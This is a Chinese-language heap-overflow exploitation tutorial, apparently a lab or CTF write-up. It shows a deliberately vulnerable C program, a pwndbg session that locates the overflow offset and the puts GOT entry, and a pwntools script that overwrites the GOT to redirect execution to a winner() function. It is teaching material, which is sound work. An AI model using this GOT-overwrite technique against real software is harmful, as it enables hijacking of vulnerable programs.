覆盖GOT
========================================

示例代码
----------------------------------------
::

	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include <time.h>
	#include <unistd.h>

	struct heapStructure {
	  int priority;
	  char *name;
	};

	int main(int argc, char **argv) {
	  struct heapStructure *i1, *i2;

	  i1 = malloc(sizeof(struct heapStructure));
	  i1->priority = 1;
	  i1->name = malloc(8);

	  i2 = malloc(sizeof(struct heapStructure));
	  i2->priority = 2;
	  i2->name = malloc(8);

	  strcpy(i1->name, argv[1]);
	  strcpy(i2->name, argv[2]);

	  printf("and that's a wrap folks!\n");
	}

	void winner() {
	  printf(
		  "Congratulations, you've completed this level @ %ld seconds past the "
		  "Epoch\n",
		  time(NULL));
	}
		
编译环境：
	+ 系统：Linux kali 5.10.0-kali9-amd64 #1 SMP Debian 5.10.46-4kali1 (2021-08-09) x86_64 GNU/Linux
	+ 编译：gcc heap.c -o heap
	
调试过程
----------------------------------------
	::
	
		ragg2 -P 200 -r
		AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA

		gdb args heap AAABAACAADAAE.... BBBB
		
		b 23 再源码23行下断点，r运行
		查看heap
		pwndbg> hexdump 0x555555559290 0x90
		+0000 0x555555559290  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │....│....│!...│....│
		+0010 0x5555555592a0  01 00 00 00  00 00 00 00  c0 92 55 55  55 55 00 00  │....│....│..UU│UU..│
		+0020 0x5555555592b0  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │....│....│!...│....│
		+0030 0x5555555592c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
		+0040 0x5555555592d0  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │....│....│!...│....│
		+0050 0x5555555592e0  02 00 00 00  00 00 00 00  00 93 55 55  55 55 00 00  │....│....│..UU│UU..│
		+0060 0x5555555592f0  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │....│....│!...│....│
		+0070 0x555555559300  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
		+0080 0x555555559310  00 00 00 00  00 00 00 00  f1 0c 02 00  00 00 00 00  │....│....│....│....│
		基本思路：
			1.代码strcpy下一个执行的函数是printf，即puts
			2.执行第一个strcpy覆盖0x5555555592e8位置为puts的got函数地址
			3.构造第二个参数为winner地址，执行第二个strcpy将puts位置got函数地址覆盖为winner地址。
			4.代码执行到printf位置，调用winner函数。
		pwndbg> n
		24        strcpy(i2->name, argv[2]);
		pwndbg> hexdump 0x555555559290 0x90
		+0000 0x555555559290  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │....│....│!...│....│
		+0010 0x5555555592a0  01 00 00 00  00 00 00 00  c0 92 55 55  55 55 00 00  │....│....│..UU│UU..│
		+0020 0x5555555592b0  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │....│....│!...│....│
		+0030 0x5555555592c0  41 41 41 42  41 41 43 41  41 44 41 41  45 41 41 46  │AAAB│AACA│ADAA│EAAF│
		+0040 0x5555555592d0  41 41 47 41  41 48 41 41  49 41 41 4a  41 41 4b 41  │AAGA│AHAA│IAAJ│AAKA│
		+0050 0x5555555592e0  41 4c 41 41  4d 41 41 4e  41 41 4f 41  41 50 41 41  │ALAA│MAAN│AAOA│APAA│
		+0060 0x5555555592f0  51 41 41 52  41 41 53 41  41 54 41 41  55 41 41 56  │QAAR│AASA│ATAA│UAAV│
		+0070 0x555555559300  41 41 57 41  41 58 41 41  59 41 41 5a  41 41 61 41  │AAWA│AXAA│YAAZ│AAaA│
		+0080 0x555555559310  41 62 41 41  63 41 41 64  41 41 65 41  41 66 41 41  │AbAA│cAAd│AAeA│AfAA│
		覆盖偏移为0x38，查看puts的got地址：
		pwndbg> got
		GOT protection: Partial RELRO | GOT functions: 5
		[0x555555558018] strcpy@GLIBC_2.2.5 -> 0x7ffff7f38250 (__strcpy_avx2) ◂— mov    rcx, rsi
		[0x555555558020] puts@GLIBC_2.2.5 -> 0x555555555056 (puts@plt+6) ◂— push   1
		[0x555555558028] printf@GLIBC_2.2.5 -> 0x555555555066 (printf@plt+6) ◂— push   2
		[0x555555558030] time@GLIBC_2.2.5 -> 0x555555555076 (time@plt+6) ◂— push   3
		[0x555555558038] malloc@GLIBC_2.2.5 -> 0x7ffff7e612f0 (malloc) ◂— mov    rax, qword ptr [rip + 0x143be1]
		即0x555555558020，查看win函数地址为0x555555555294
			
编写EXP
----------------------------------------
	::
	
		from pwn import *
		elf = context.binary = ELF('./heap', checksec=False)
		#param1 = (b'A' * 40 + p64(elf.got['puts'])).replace(b'\x00', b'')
		#param2 = p64(elf.sym['winner']).replace(b'\x00', b'')
		param1 = (b'A' * 40 + p64(0x555555558020)).replace(b'\x00', b'')
		param2 = p64(0x555555555294).replace(b'\x00', b'')
		p = elf.process(argv=[param1, param2])
		print(p.clean().decode('latin-1'))
